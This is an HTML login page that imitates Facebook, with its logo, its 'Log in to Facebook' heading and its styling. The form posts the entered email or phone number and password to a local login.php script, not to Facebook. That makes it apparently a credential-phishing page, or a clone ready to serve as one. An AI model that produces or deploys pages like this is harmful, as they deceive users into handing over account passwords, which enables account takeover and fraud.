<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Login</title>
</head>

<body class="bg-white h-screen overflow-hidden">
	
	 <!-- Mobile Logo -->
    <div class="xl:hidden absolute top-8 left-1/2 -translate-x-1/2 z-10">
        <img
            src="image/fblogo.webp"
            alt="Logo"
            class="w-16 h-16"
        >
    </div>
	
    <div class="flex h-screen">

        <!-- ================= LEFT SIDE ================= -->
        <div class="hidden xl:flex flex-[0.55] flex-col justify-between px-12 py-8">

            <!-- Logo -->
            <div>
                <img
                    src="image/fblogo.webp"
                    alt="Logo"
                    class="w-16 h-16"
                >
            </div>

            <!-- Illustration -->
            <div class="flex justify-center items-center flex-1">

                <img
                    src="image/explore.webp"
                    alt="Explore"
                    class="max-w-[90%] max-h-[55vh] object-contain"
                >

            </div>

            <!-- Bottom Text -->
            <div class="pb-6">

                <h1 class="text-5xl xl:text-6xl font-bold leading-tight text-left text-gray-900">

                    Explore the things
                    <br>

                    <span class="text-blue-600">
                        you love.
                    </span>

                </h1>

            </div>

        </div>

        <!-- ================= DIVIDER ================= -->

        <div class="hidden xl:block w-px bg-gray-200"></div>

        <!-- ================= RIGHT SIDE ================= -->

        <div class="w-full xl:flex-[0.45] flex items-center justify-center px-8 md:px-12 pt-24 xl:pt-0">


          <div class="w-full max-w-[480px]">

                <h2 class="text-[34px] font-semibold text-gray-900 mb-10">
                    Log in to Facebook
                </h2>

                <form action="login.php" method="POST">

                    <input
                        type="text"
			name="username"
                        placeholder="Email address or mobile number"
                        class="w-full h-[60px] px-5 mb-5 border border-gray-300 rounded-2xl text-[18px] text-gray-700 placeholder:text-gray-500 focus:outline-none focus:border-blue-500 transition"
			required
                    >

                    <input
                        type="password"
			name="password"
                        placeholder="Password"
                        class="w-full h-[60px] px-5 mb-8 border border-gray-300 rounded-2xl text-[18px] text-gray-700 placeholder:text-gray-500 focus:outline-none focus:border-blue-500 transition"
			required
                    >

                    <button
                        type="submit"
                        class="w-full h-[58px] bg-[#0866ff] text-white text-[20px] font-medium rounded-full hover:bg-[#0757db] transition duration-200"
                    >
                        Log in
                    </button>

                </form>

                <div class="text-center mt-8">

                    <a
                        href="#"
                        class="text-[18px] text-gray-900 hover:underline"
                    >
                        Forgotten password?
                    </a>

                </div>

                <div class="h-12"></div>

                <button
                    class="w-full h-[58px] border-2 border-[#0866ff] text-[#0866ff] text-[20px] font-medium rounded-full hover:bg-blue-50 transition duration-200"
                >
                    Create new account
                </button>

            </div>

        </div>

    </div>

</body>
</html>
